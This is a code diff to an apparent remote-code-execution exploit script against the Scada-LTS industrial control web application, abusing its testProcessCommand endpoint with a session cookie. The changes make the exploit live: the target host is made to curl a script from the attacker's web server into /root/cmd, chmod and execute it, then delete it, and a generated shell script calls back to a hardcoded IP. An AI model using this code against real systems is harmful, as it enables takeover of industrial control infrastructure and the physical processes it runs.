@@ -36,7 +36,7 @@ def execute_cmd(cmd, scada_url, username, password):
     headers = {'Cookie': jsession_cookie,
     'Content-Type': 'text/plain'}
 
-    cmd = urllib.parse.quote_plus(cmd)
+    cmd = urllib.parse.quote_plus('command:'+cmd)
     
     print("POST res sent")
     res = requests.post(scada_url+'/ScadaLTS/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr', 
@@ -46,21 +46,22 @@ def execute_cmd(cmd, scada_url, username, password):
 
 def execute_script(scriptname, this_ip, username, password):
     global scada_url # temporary solution
-    print('Executing script')
+    print('Executing script (in 120s)')
+    time.sleep(120)
 
     for i in range(30):
         try:
             print(f"Tentativo {i}")
-            #time.sleep(5)
+            time.sleep(20)
             print("trying curl")
-            execute_cmd(f"test:curl {this_ip}:{PORT}/get_script/{scriptname} -o /root/cmd", scada_url, username, password)
+            execute_cmd(f"curl {this_ip}:{PORT}/get_script/{scriptname} -o /root/cmd", scada_url, username, password)
             print("trying chmod")
-            execute_cmd("test:chmod 777 /root/cmd", scada_url, username, password)
+            execute_cmd("chmod 777 /root/cmd", scada_url, username, password)
             print("trying exec")
-            execute_cmd("test:/root/cmd", scada_url, username, password)
+            execute_cmd("/root/cmd", scada_url, username, password)
             time.sleep(5)
             print("trying rm")
-            execute_cmd("test:rm -f /root/cmd", scada_url, username, password)
+            execute_cmd("rm -f /root/cmd", scada_url, username, password)
             time.sleep(5)
         except Exception as e:
             print("error")
@@ -78,13 +79,14 @@ def get_ip_address(ifname):
     return ret
 
 if __name__ == "__main__":
-    ip = get_ip_address('eth0')
+    ip = get_ip_address('eth0') # TODO Unreachable using real ip (not management)
     print('ip: '+ip)
+    ip = '10.0.0.42'
     with open('scripts/fetch_and_send.sh', 'w') as f:
-        f.write(f'#!/bin/sh\ncurl http://{ip}:{PORT}/test')
+        f.write(f'#!/bin/sh\ncurl {ip}:{PORT}/test')
 
     ### WEBSERVER
-    webserverThread = threading.Thread(target=app.run, args={'host':'0.0.0.0', 'port':PORT})
+    webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', PORT))
     webserverThread.start()
 
     ### RCE
